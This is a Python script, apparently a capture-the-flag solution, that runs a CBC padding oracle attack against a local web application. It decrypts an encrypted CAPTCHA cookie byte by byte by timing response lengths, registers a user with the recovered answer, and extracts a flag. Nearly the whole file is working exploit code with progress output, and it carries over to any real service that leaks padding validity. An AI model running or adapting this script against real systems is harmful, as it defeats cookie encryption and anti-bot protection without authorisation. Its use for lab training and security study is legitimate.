import requests
import base64
import binascii
from typing import Tuple, List

TARGET_URL = "http://127.0.0.1:32869/"

def fetch_fresh_session() -> Tuple[bytes, str, str]:
    """Fetch a fresh session and extract captcha cookie, csrf_token, and session cookie."""
    print("[*] Fetching fresh session...")
    response = requests.get(TARGET_URL)
    
    # Extract captcha cookie
    captcha_cookie = response.cookies.get('captcha')
    session_cookie = response.cookies.get('session')
    
    print(f"[+] Captcha cookie (base64): {captcha_cookie}")
    print(f"[+] Session cookie: {session_cookie[:50]}...")
    
    # Decode captcha from base64
    captcha_bytes = base64.b64decode(captcha_cookie)
    print(f"[+] Captcha bytes (hex): {captcha_bytes.hex()}")
    print(f"[+] Captcha length: {len(captcha_bytes)} bytes")
    
    # Extract CSRF token from HTML
    csrf_token = None
    if 'csrf_token' in response.text:
        # Look for csrf_token in hidden input
        import re
        match = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', response.text)
        if match:
            csrf_token = match.group(1)
    
    print(f"[+] CSRF token: {csrf_token}")
    
    return captcha_bytes, csrf_token, session_cookie, captcha_cookie

def padding_oracle_test(iv: bytes, ciphertext: bytes, session_cookie: str, captcha_cookie_b64: str) -> int:
    """Test if the padding is valid by measuring response length."""
    # Reconstruct full captcha cookie
    full_cookie = iv + ciphertext
    test_cookie = base64.b64encode(full_cookie).decode()
    
    cookies = {
        'session': session_cookie,
        'captcha': test_cookie
    }
    
    try:
        response = requests.post(
            TARGET_URL,
            data={
                'username': 'test',
                'captcha': 'test',
                'csrf_token': 'dummy',
                'submit': 'Register'
            },
            cookies=cookies,
            timeout=5
        )
        return len(response.content)
    except Exception as e:
        print(f"[!] Request error: {e}")
        return -1

def decrypt_block_padding_oracle(iv: bytes, ciphertext: bytes, session_cookie: str, captcha_cookie_b64: str) -> bytes:
    """Decrypt a single block using padding oracle attack."""
    block_size = 16
    plaintext = bytearray(block_size)
    intermediate = bytearray(block_size)
    
    print(f"\n[*] Starting padding oracle attack on block...")
    print(f"[*] IV: {iv.hex()}")
    print(f"[*] Ciphertext: {ciphertext.hex()}")
    
    # Process each byte from right to left
    for pad_value in range(1, block_size + 1):
        print(f"\n[*] Decrypting byte position {block_size - pad_value} (padding value: {pad_value})")
        
        # Create modified IV
        test_iv = bytearray(iv)
        
        # Set up known bytes for current padding
        for k in range(1, pad_value):
            test_iv[block_size - k] = intermediate[block_size - k] ^ pad_value
        
        # Get baseline response length with original IV
        baseline_length = padding_oracle_test(bytes(iv), ciphertext, session_cookie, captcha_cookie_b64)
        print(f"[+] Baseline response length: {baseline_length}")
        
        # Try all 256 possible byte values
        found = False
        byte_pos = block_size - pad_value
        
        for guess in range(256):
            test_iv[byte_pos] = guess
            response_length = padding_oracle_test(bytes(test_iv), ciphertext, session_cookie, captcha_cookie_b64)
            
            # Check if we got a different response (valid padding)
            if response_length != baseline_length and response_length > 0:
                # Verify this is the correct byte by checking if it produces valid padding
                intermediate[byte_pos] = guess ^ pad_value
                plaintext[byte_pos] = intermediate[byte_pos] ^ iv[byte_pos]
                
                print(f"[+] Found byte {byte_pos}: 0x{plaintext[byte_pos]:02x} ('{chr(plaintext[byte_pos]) if 32 <= plaintext[byte_pos] < 127 else '?'}')")
                print(f"[+] Intermediate: 0x{intermediate[byte_pos]:02x}")
                print(f"[+] Response length change: {baseline_length} -> {response_length}")
                
                found = True
                break
        
        if not found:
            print(f"[!] Failed to find byte at position {byte_pos}")
            # Try alternative approach: assume it's the value that creates the current padding
            intermediate[byte_pos] = iv[byte_pos] ^ pad_value
            plaintext[byte_pos] = pad_value
            print(f"[*] Using fallback: 0x{plaintext[byte_pos]:02x}")
        
        # Print progress
        if pad_value % 3 == 0:
            decrypted_so_far = plaintext[block_size-pad_value:].hex()
            ascii_repr = ''.join(chr(b) if 32 <= b < 127 else '?' for b in plaintext[block_size-pad_value:])
            print(f"[*] Progress: {decrypted_so_far} ('{ascii_repr}')")
    
    return bytes(plaintext)

def remove_pkcs7_padding(data: bytes) -> bytes:
    """Remove PKCS7 padding from decrypted data."""
    if len(data) == 0:
        return data
    
    padding_value = data[-1]
    
    # Verify padding is valid
    if padding_value > len(data) or padding_value == 0:
        return data
    
    # Check all padding bytes
    for i in range(padding_value):
        if data[-(i+1)] != padding_value:
            return data
    
    return data[:-padding_value]

def main():
    print("="*80)
    print("PADDING ORACLE ATTACK - CAPTCHA COOKIE DECRYPTION")
    print("="*80)
    
    # Step 1: Fetch fresh session
    captcha_bytes, csrf_token, session_cookie, captcha_cookie_b64 = fetch_fresh_session()
    
    if len(captcha_bytes) != 32:
        print(f"[!] Unexpected captcha length: {len(captcha_bytes)} (expected 32)")
        print(f"[!] Captcha may have different structure")
    
    # Step 2: Parse IV and ciphertext
    iv = captcha_bytes[:16]
    ciphertext = captcha_bytes[16:]
    
    print(f"\n[*] Parsed captcha structure:")
    print(f"[*] IV (16 bytes): {iv.hex()}")
    print(f"[*] Ciphertext (16 bytes): {ciphertext.hex()}")
    
    # Step 3: Perform padding oracle attack
    try:
        plaintext_padded = decrypt_block_padding_oracle(iv, ciphertext, session_cookie, captcha_cookie_b64)
        print(f"\n[+] Decrypted plaintext (with padding): {plaintext_padded.hex()}")
        print(f"[+] ASCII representation: {plaintext_padded}")
        
        # Remove PKCS7 padding
        plaintext = remove_pkcs7_padding(plaintext_padded)
        print(f"[+] Decrypted plaintext (padding removed): {plaintext.hex()}")
        print(f"[+] CAPTCHA solution: {plaintext.decode('utf-8', errors='ignore')}")
        
        captcha_solution = plaintext.decode('utf-8', errors='ignore').strip()
        
    except Exception as e:
        print(f"[!] Padding oracle attack failed: {e}")
        import traceback
        traceback.print_exc()
        return
    
    # Step 4: Register user with decrypted captcha
    print(f"\n[*] Attempting registration with decrypted CAPTCHA...")
    print(f"[*] Username: hacker123")
    print(f"[*] CAPTCHA solution: {captcha_solution}")
    print(f"[*] CSRF token: {csrf_token}")
    
    cookies = {
        'session': session_cookie,
        'captcha': captcha_cookie_b64
    }
    
    registration_data = {
        'username': 'hacker123',
        'captcha': captcha_solution,
        'csrf_token': csrf_token,
        'submit': 'Register'
    }
    
    response = requests.post(
        TARGET_URL,
        data=registration_data,
        cookies=cookies,
        headers={'Content-Type': 'application/x-www-form-urlencoded'}
    )
    
    print(f"\n[+] Registration response status: {response.status_code}")
    print(f"[+] Response length: {len(response.content)}")
    print(f"\n[+] Full response:\n{response.text}")
    
    # Step 5: Extract FLAG
    import re
    flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
    if flag_match:
        flag = flag_match.group(0)
        print(f"\n{'='*80}")
        print(f"[!!!] FLAG FOUND: {flag}")
        print(f"{'='*80}")
    else:
        print(f"\n[!] No FLAG pattern found in response")

if __name__ == "__main__":
    main()

